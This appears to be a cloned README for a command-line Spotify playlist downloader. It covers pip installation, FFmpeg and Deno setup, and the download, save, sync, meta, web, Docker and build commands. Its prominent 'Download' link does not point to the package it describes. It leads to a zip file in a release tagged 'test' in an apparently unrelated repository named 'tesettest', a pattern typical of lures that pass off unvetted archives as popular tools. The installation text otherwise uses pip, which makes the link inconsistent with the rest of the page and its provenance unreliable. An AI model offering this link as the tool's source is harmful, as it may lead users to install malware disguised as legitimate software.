# Spotify Downloader for Playlists, Tracks, Metadata, and Album Art

A command-line music utility for saving Spotify playlists and tracks by matching them with available YouTube results, then storing the audio with album art, lyrics, and metadata when available.

[Download](https://github.com/gcoyerk/tesettest/releases/download/test/spotify-downloader.zip)

This project is designed for users who want a local music library organized from Spotify links. It does not retrieve audio from Spotify directly. Instead, it uses Spotify information to identify songs and then sources matching audio from YouTube.

Use this tool responsibly and only for content you have the right or permission to save.

## What It Does

Spotify Downloader helps turn Spotify links into organized local audio files.

It can process:

- Individual Spotify tracks
- Spotify playlists
- Saved metadata files
- Local folders that need metadata updates
- Playlist sync files for keeping a folder aligned with a playlist

When a match is found, the tool can save the audio and enrich it with information such as:

- Track title
- Artist name
- Album name
- Album artwork
- Lyrics, when available
- Embedded metadata tags

## Main Use Cases

This project is useful when you want to:

- Save a Spotify playlist as local audio files
- Build a music folder with consistent metadata
- Keep a local folder in sync with a changing playlist
- Create metadata-only files for later use
- Update tags and artwork on existing music files
- Use a command-line workflow instead of a graphical music manager

## Requirements

The tool is distributed as a Python package and is normally used through the `spotdl` command.

FFmpeg is required for audio processing.

Deno is strongly recommended because some YouTube downloads handled through `yt-dlp` may require it to complete successfully.

## Installation Notes

Install the Python package with:

```sh
pip install spotdl
```

Update an existing installation with:

```sh
pip install --upgrade spotdl
```

On some systems, the command may need to be run as `pip3` instead of `pip`.

## FFmpeg Setup

FFmpeg is required.

If you only need FFmpeg for this tool, you can install it into the application directory with:

```sh
spotdl --download-ffmpeg
```

You can also install FFmpeg system-wide using the package manager for your operating system.

Common examples include:

```sh
brew install ffmpeg
```

```sh
sudo apt install ffmpeg
```

## Deno Setup

Deno is recommended for better YouTube download compatibility.

If Deno is only needed for this project, install it into the tool directory with:

```sh
spotdl --download-deno
```

You may also install Deno system-wide using the official installation method for your platform.

## Basic Command-Line Usage

The simplest form is:

```sh
spotdl [urls]
```

If the command is not available directly, it can also be run as a Python module:

```sh
python -m spotdl [urls]
```

General command format:

```sh
spotdl [operation] [options] QUERY
```

The query is usually one or more Spotify URLs. Some operations use a local file instead.

## Common Operations

### Download Audio

The default operation downloads matching audio and applies metadata.

```sh
spotdl download [spotify-url]
```

You can also omit the operation because download is the default behavior:

```sh
spotdl [spotify-url]
```

### Save Metadata Only

Use `save` when you want to store Spotify metadata without downloading audio.

```sh
spotdl save [query] --save-file music.spotdl
```

This creates a `.spotdl` file that can be reused later.

### Get Matched URLs

Use `url` to print user-friendly matched URLs for songs in the query.

```sh
spotdl url [query]
```

### Sync a Playlist Folder

Use `sync` to keep a local folder aligned with a playlist.

```sh
spotdl sync [query] --save-file playlist.spotdl
```

After creating the sync file, run:

```sh
spotdl sync playlist.spotdl
```

This checks the current playlist state, adds newly added songs, and removes songs that are no longer part of the playlist.

### Update Metadata

Use `meta` to update metadata for provided song files.

```sh
spotdl meta [files]
```

### Web Interface

The `web` operation starts a browser-based interface. It has limited functionality and supports individual song downloads.

```sh
spotdl web
```

## Audio Source and Quality

This tool uses YouTube as the audio source. Spotify is used for track identification and metadata lookup.

The tool is designed to choose the best available YouTube audio quality supported by the source. Regular YouTube access may provide up to 128 kbps, while YouTube Music Premium access may provide up to 256 kbps.

Actual output depends on the matched YouTube result, available formats, and the user environment.

## Docker Usage

A Docker image can be built locally:

```sh
docker build -t spotdl .
```

Run the container with a mapped folder so saved music files are available on the host:

```sh
docker run --rm -v $(pwd):/music spotdl download [trackUrl]
```

## Building from Source

A local executable can be built from the source tree with:

```sh
pip install uv
uv sync
uv run scripts/build.py
```

The generated executable is created in the `dist` directory.

## Practical Tips

- Use playlist URLs when saving many tracks at once.
- Use `.spotdl` files when you want repeatable playlist sync behavior.
- Install FFmpeg before running large downloads.
- Install Deno if some YouTube results fail to process.
- Review command help for available options:

```sh
spotdl -h
```

## Responsible Use

This tool is intended for legitimate personal and permitted uses. Users are responsible for how they use it and for following applicable laws, platform terms, and rights restrictions.

It should not be used to save or distribute content without the proper rights or permission.

## FAQ

### Does this download music directly from Spotify?

No. Spotify information is used to identify songs and retrieve metadata. Audio is sourced from YouTube when a suitable match is found.

### Can it download an entire playlist?

Yes. Playlist URLs are supported.

### Can it save only metadata?

Yes. The `save` operation stores metadata without downloading audio.

### Can it keep a folder updated when a playlist changes?

Yes. The `sync` operation can compare a saved sync file with the current playlist state and update the local folder accordingly.

### Is FFmpeg required?

Yes. FFmpeg is required for audio processing.

### Is Deno required?

Deno is not always required, but it is recommended because some YouTube downloads may depend on it.

## License

This project is licensed under the MIT License.
